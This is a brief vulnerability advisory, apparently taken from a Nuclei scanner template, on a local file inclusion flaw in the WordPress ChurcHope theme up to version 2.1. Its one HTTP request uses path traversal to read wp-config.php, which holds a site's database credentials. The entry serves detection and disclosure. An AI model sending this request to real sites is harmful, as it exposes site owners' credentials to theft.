# Vulnerability: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`churchope-lfi.yaml`)

## Description
WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which is publicly accessible.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
```

